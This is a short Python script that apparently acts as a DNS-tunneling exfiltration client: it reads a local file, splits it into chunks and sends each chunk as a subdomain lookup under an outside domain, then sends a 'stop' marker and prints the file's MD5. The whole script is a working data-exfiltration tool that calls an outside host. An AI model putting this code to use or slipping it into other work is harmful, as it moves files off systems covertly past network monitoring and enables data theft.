import dns.resolver
from time import sleep
from core import file2string, string2msg, file2md5


DOMAIN = '.msg.moofeng.cn'
def query(msg):
    try:
        dns.resolver.query(msg + DOMAIN, 'A', raise_on_no_answer=False)
    except dns.resolver.NoAnswer:
        pass

string = file2string('test.txt')
msg = string2msg(string, n=30)
for _ in msg:
    print(f"[+] Sending: {_}")
    query(_)
query('stop')
md5 = file2md5('test.txt')
print(f"[+] MD5: {md5}")